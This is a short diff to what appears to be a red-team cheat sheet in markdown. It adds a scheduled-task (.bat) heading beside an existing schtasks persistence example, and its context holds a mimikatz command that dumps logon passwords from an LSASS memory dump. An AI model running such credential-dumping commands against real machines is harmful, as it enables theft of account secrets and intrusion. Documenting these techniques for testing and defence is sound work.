@@ -15,7 +15,10 @@ $hourMinute = $time.ToString("HH:mm")
 
 SCHTASKS /Create /SC ONCE /TN "Open Notepad" /TR "notepad.exe" /ST $hourMinute
 ```
-
+##### SCHTASKS (.bat)
+```
+1.bat
+```
 
 
 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
